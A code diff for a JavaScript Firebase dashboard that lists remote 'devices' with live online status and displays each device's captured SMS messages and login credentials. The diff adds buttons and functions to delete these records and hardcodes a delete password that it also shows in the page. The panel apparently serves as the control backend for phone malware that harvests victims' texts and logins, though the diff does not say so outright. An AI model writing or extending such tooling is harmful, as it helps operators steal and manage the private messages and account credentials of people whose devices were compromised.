@@ -50,9 +50,6 @@ const MIN_RENDER_INTERVAL = 500;
 let lastDataHash = '';
 let deletePassword = '9999';
 let isFirstLoad = true;
-let deviceListCache = {};
-let smsListCache = {};
-let loginListCache = {};
 
 // ============================================================
 // DOM REFS
@@ -82,29 +79,23 @@ db.ref(".info/connected").on("value", (snap) => {
 db.ref().on("value", (snapshot) => {
     const newData = snapshot.val() || {};
     
-    // Check if data actually changed
     const newHash = JSON.stringify(newData);
     if (newHash === lastDataHash) {
         return;
     }
     
-    // Store data
     cachedData = newData;
     lastDataHash = newHash;
     
-    // Update caches
     updateDeviceOnlineStatus();
     buildDeviceCaches();
     
-    // Check if user is typing
     const active = document.activeElement;
     const typing = active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA' || active.tagName === 'SELECT');
     if (typing) {
-        // Still update caches but don't render
         return;
     }
     
-    // Throttle render calls
     const now = Date.now();
     if (now - lastRenderTime < MIN_RENDER_INTERVAL) {
         if (renderTimeout) clearTimeout(renderTimeout);
@@ -137,19 +128,15 @@ db.ref().on("value", (snapshot) => {
 function buildDeviceCaches() {
     const devices = cachedData.user_data || {};
     const smsData = cachedData.user_sms || {};
-    const loginData = cachedData.login || {};
     
-    // Build device list cache
     allDeviceKeys = Object.keys(devices);
     
-    // Build SMS cache per device
     allDeviceKeys.forEach(devId => {
         if (smsData[devId]) {
             const keys = Object.keys(smsData[devId]);
             if (!deviceSmsCache[devId]) {
                 deviceSmsCache[devId] = { offset: 0, all: [] };
             }
-            // Only update if changed
             const newAll = keys.map(k => smsData[devId][k]);
             if (JSON.stringify(deviceSmsCache[devId].all) !== JSON.stringify(newAll)) {
                 deviceSmsCache[devId].all = newAll;
@@ -172,7 +159,6 @@ function updateDeviceOnlineStatus() {
         const isRecent = (currentTime - lastSeen) < 120000;
         const status = isOnline || isRecent;
         
-        // Only update if changed
         if (deviceOnlineStatus[devId] !== status) {
             deviceOnlineStatus[devId] = status;
         }
@@ -187,10 +173,8 @@ function performRender() {
     isRendering = true;
     
     try {
-        // Update counts first (quick)
         updateCounts();
         
-        // Render only visible panels
         if (isPanelOpen.devices) {
             renderDevicesOptimized();
         }
@@ -235,16 +219,160 @@ function updateCounts() {
 }
 
 // ============================================================
+// DELETE ALL CREDENTIALS
+// ============================================================
+function deleteAllCredentials() {
+    const password = prompt('🔐 Enter Password to Delete ALL Credentials:');
+    if (password === null) return;
+    
+    if (password !== deletePassword) {
+        showToast('❌ Incorrect Password!', 'error');
+        return;
+    }
+    
+    if (!confirm('⚠️ Are you sure you want to DELETE ALL CREDENTIALS (login data) for all devices? This action cannot be undone!')) {
+        return;
+    }
+    
+    const loginData = cachedData.login || {};
+    if (Object.keys(loginData).length === 0) {
+        showToast('📭 No credentials to delete', 'info');
+        return;
+    }
+    
+    showToast('⏳ Deleting all credentials...', 'info');
+    
+    const promises = [];
+    Object.keys(loginData).forEach(devId => {
+        promises.push(db.ref(`login/${devId}`).remove());
+    });
+    
+    Promise.all(promises).then(() => {
+        showToast('✅ All credentials deleted successfully!', 'success');
+        performRender();
+    }).catch(err => {
+        showToast('❌ Error deleting credentials: ' + err.message, 'error');
+    });
+}
+
+// ============================================================
+// DELETE DEVICE CREDENTIALS
+// ============================================================
+function deleteDeviceCredentials(devId) {
+    const password = prompt('🔐 Enter Password to Delete Credentials:');
+    if (password === null) return;
+    
+    if (password !== deletePassword) {
+        showToast('❌ Incorrect Password!', 'error');
+        return;
+    }
+    
+    if (!confirm(`⚠️ Delete all credentials for device ${devId}?`)) {
+        return;
+    }
+    
+    const loginData = cachedData.login || {};
+    if (!loginData[devId] || Object.keys(loginData[devId]).length === 0) {
+        showToast('📭 No credentials for this device', 'info');
+        return;
+    }
+    
+    showToast(`⏳ Deleting credentials for ${devId}...`, 'info');
+    
+    db.ref(`login/${devId}`).remove().then(() => {
+        showToast(`✅ Credentials deleted for ${devId}`, 'success');
+        performRender();
+    }).catch(err => {
+        showToast('❌ Error: ' + err.message, 'error');
+    });
+}
+
+// ============================================================
+// DELETE ALL SMS
+// ============================================================
+function deleteAllSms() {
+    const password = prompt('🔐 Enter Password to Delete All SMS:');
+    if (password === null) return;
+    
+    if (password !== deletePassword) {
+        showToast('❌ Incorrect Password!', 'error');
+        return;
+    }
+    
+    if (!confirm('⚠️ Are you sure you want to DELETE ALL SMS messages? This action cannot be undone!')) {
+        return;
+    }
+    
+    const smsData = cachedData.user_sms || {};
+    if (Object.keys(smsData).length === 0) {
+        showToast('📭 No SMS to delete', 'info');
+        return;
+    }
+    
+    showToast('⏳ Deleting all SMS...', 'info');
+    
+    const promises = [];
+    Object.keys(smsData).forEach(devId => {
+        promises.push(db.ref(`user_sms/${devId}`).remove());
+    });
+    
+    Promise.all(promises).then(() => {
+        showToast('✅ All SMS deleted successfully!', 'success');
+        Object.keys(deviceSmsCache).forEach(key => {
+            deviceSmsCache[key] = { offset: 0, all: [] };
+        });
+        allSmsList = [];
+        allSmsOffset = 0;
+        performRender();
+    }).catch(err => {
+        showToast('❌ Error deleting SMS: ' + err.message, 'error');
+    });
+}
+
+// ============================================================
+// DELETE DEVICE SMS
+// ============================================================
+function deleteDeviceSms(devId) {
+    const password = prompt('🔐 Enter Password to Delete SMS:');
+    if (password === null) return;
+    
+    if (password !== deletePassword) {
+        showToast('❌ Incorrect Password!', 'error');
+        return;
+    }
+    
+    if (!confirm(`⚠️ Delete all SMS for device ${devId}?`)) {
+        return;
+    }
+    
+    const smsData = cachedData.user_sms || {};
+    if (!smsData[devId] || Object.keys(smsData[devId]).length === 0) {
+        showToast('📭 No SMS for this device', 'info');
+        return;
+    }
+    
+    showToast(`⏳ Deleting SMS for ${devId}...`, 'info');
+    
+    db.ref(`user_sms/${devId}`).remove().then(() => {
+        showToast(`✅ SMS deleted for ${devId}`, 'success');
+        deviceSmsCache[devId] = { offset: 0, all: [] };
+        allSmsList = [];
+        allSmsOffset = 0;
+        performRender();
+    }).catch(err => {
+        showToast('❌ Error: ' + err.message, 'error');
+    });
+}
+
+// ============================================================
 // RENDER DEVICES OPTIMIZED - NO BLINK
 // ============================================================
 function renderDevicesOptimized() {
     const container = $('devicesContainer');
     const devices = cachedData.user_data || {};
     
-    // Update online status
     updateDeviceOnlineStatus();
     
-    // Get filtered and sorted keys
     let keys = getFilteredDeviceKeys();
     
     if (keys.length === 0) {
@@ -273,10 +401,8 @@ function renderDevicesOptimized() {
         const statusText = online ? '● Online' : '● Offline';
         const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
         
-        // Get SMS count
         const totalSms = deviceSmsCache[devId] ? deviceSmsCache[devId].all.length : 0;
         
-        // Get login data
         const loginData = cachedData.login || {};
         let devLoginList = [];
         if (loginData[devId]) {
@@ -287,7 +413,6 @@ function renderDevicesOptimized() {
         const isExpanded = expandedDevices[devId] || false;
         const activeTab = activeTabs[devId] || null;
         
-        // Get SMS list for display
         let devSmsList = [];
         const hasMoreSms = deviceSmsCache[devId] && 
             (deviceSmsCache[devId].offset + SMS_LIMIT < deviceSmsCache[devId].all.length);
@@ -299,7 +424,6 @@ function renderDevicesOptimized() {
             devSmsList = cache.all.slice(startIdx, endIdx).reverse();
         }
         
-        // Build login HTML
         let allLoginHtml = '';
         if (devLoginList.length > 0) {
             allLoginHtml = devLoginList.map((rec, idx) => {
@@ -381,7 +505,10 @@ function renderDevicesOptimized() {
 
                     <!-- Login Section -->
                     <div class="section-box ${activeTab === 'login' ? 'active' : ''}" id="sec-login-${devId}">
-                        <h4 style="color:#f59e0b;font-size:13px;">🔑 All Credentials</h4>
+                        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
+                            <h4 style="color:#f59e0b;font-size:13px;">🔑 All Credentials (${devLoginList.length})</h4>
+                            ${devLoginList.length > 0 ? `<button onclick="event.stopPropagation();deleteDeviceCredentials('${devId}')" style="background:var(--red);color:#fff;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;">🗑️ Delete All</button>` : ''}
+                        </div>
                         <div class="login-cards">
                             ${devLoginList.length === 0 ? '<div class="empty-luxury">No credentials found</div>' : allLoginHtml}
                         </div>
@@ -453,6 +580,9 @@ function renderDevicesOptimized() {
                             <button class="btn-luxury btn-red" onclick="event.stopPropagation();deleteDeviceSms('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                                 <i class="fas fa-trash"></i> Delete All SMS
                             </button>
+                            <button class="btn-luxury btn-red" onclick="event.stopPropagation();deleteDeviceCredentials('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;background:var(--purple);">
+                                <i class="fas fa-trash"></i> Delete All Credentials
+                            </button>
                         </div>
                         <div style="margin-top:8px;font-size:10px;color:var(--text-muted);padding:8px;background:rgba(239,68,68,0.05);border-radius:6px;border:1px solid rgba(239,68,68,0.1);">
                             ⚠️ Password required: <span style="color:var(--gold);font-weight:600;">9999</span>
@@ -465,7 +595,6 @@ function renderDevicesOptimized() {
     
     container.innerHTML = html;
     
-    // Add load more button
     if (hasMore) {
         const remaining = keys.length - end;
         container.innerHTML += `
@@ -495,7 +624,6 @@ function getFilteredDeviceKeys() {
     const devices = cachedData.user_data || {};
     let keys = Object.keys(devices);
     
-    // Search filter
     if (searchQuery) {
         keys = keys.filter(id => {
             const dev = devices[id] || {};
@@ -506,14 +634,12 @@ function getFilteredDeviceKeys() {
         });
     }
     
-    // Sort by serial
     keys.sort((a, b) => {
         const serialA = getDeviceSerial(a);
         const serialB = getDeviceSerial(b);
         return serialB - serialA;
     });
     
-    // Online/Offline filter
     if (currentFilter === 'online') {
         keys = keys.filter(id => isDeviceOnline(id));
     } else if (currentFilter === 'offline') {
@@ -620,13 +746,11 @@ function setTab(devId, tab) {
         const card = document.getElementById(`card-${devId}`);
         if (!card) return;
         
-        // Update button states
         const buttons = card.querySelectorAll('.device-actions-luxury .sub-btn');
         buttons.forEach(btn => {
             btn.className = btn.className.replace(/active-\w+/g, '').trim();
         });
         
-        // Update section visibility
         const sections = card.querySelectorAll('.section-box');
         sections.forEach(sec => sec.classList.remove('active'));
         
@@ -670,83 +794,6 @@ function clearSearch() {
 }
 
 // ============================================================
-// DELETE ALL SMS
-// ============================================================
-function deleteAllSms() {
-    const password = prompt('🔐 Enter Password to Delete All SMS:');
-    if (password === null) return;
-    
-    if (password !== deletePassword) {
-        showToast('❌ Incorrect Password!', 'error');
-        return;
-    }
-    
-    if (!confirm('⚠️ Are you sure you want to DELETE ALL SMS messages? This action cannot be undone!')) {
-        return;
-    }
-    
-    const smsData = cachedData.user_sms || {};
-    if (Object.keys(smsData).length === 0) {
-        showToast('📭 No SMS to delete', 'info');
-        return;
-    }
-    
-    showToast('⏳ Deleting all SMS...', 'info');
-    
-    const promises = [];
-    Object.keys(smsData).forEach(devId => {
-        promises.push(db.ref(`user_sms/${devId}`).remove());
-    });
-    
-    Promise.all(promises).then(() => {
-        showToast('✅ All SMS deleted successfully!', 'success');
-        Object.keys(deviceSmsCache).forEach(key => {
-            deviceSmsCache[key] = { offset: 0, all: [] };
-        });
-        allSmsList = [];
-        allSmsOffset = 0;
-        performRender();
-    }).catch(err => {
-        showToast('❌ Error deleting SMS: ' + err.message, 'error');
-    });
-}
-
-// ============================================================
-// DELETE DEVICE SMS
-// ============================================================
-function deleteDeviceSms(devId) {
-    const password = prompt('🔐 Enter Password to Delete SMS:');
-    if (password === null) return;
-    
-    if (password !== deletePassword) {
-        showToast('❌ Incorrect Password!', 'error');
-        return;
-    }
-    
-    if (!confirm(`⚠️ Delete all SMS for device ${devId}?`)) {
-        return;
-    }
-    
-    const smsData = cachedData.user_sms || {};
-    if (!smsData[devId] || Object.keys(smsData[devId]).length === 0) {
-        showToast('📭 No SMS for this device', 'info');
-        return;
-    }
-    
-    showToast(`⏳ Deleting SMS for ${devId}...`, 'info');
-    
-    db.ref(`user_sms/${devId}`).remove().then(() => {
-        showToast(`✅ SMS deleted for ${devId}`, 'success');
-        deviceSmsCache[devId] = { offset: 0, all: [] };
-        allSmsList = [];
-        allSmsOffset = 0;
-        performRender();
-    }).catch(err => {
-        showToast('❌ Error: ' + err.message, 'error');
-    });
-}
-
-// ============================================================
 // CHECK DEVICE STATUS - LIVE
 // ============================================================
 function checkDeviceStatus(devId) {
@@ -760,7 +807,6 @@ function checkDeviceStatus(devId) {
     statusEl.textContent = '⏳ Checking...';
     statusEl.className = 'device-status checking';
     
-    // Check directly from Firebase
     db.ref(`user_data/${devId}`).once('value').then(snap => {
         if (snap.exists()) {
             const dev = snap.val();
@@ -1487,7 +1533,6 @@ document.addEventListener('DOMContentLoaded', function() {
     
     $('filterAll').classList.add('active');
     
-    // Search input listener with debounce
     const searchInput = $('deviceSearchInput');
     const clearBtn = $('searchClearBtn');
     if (searchInput) {
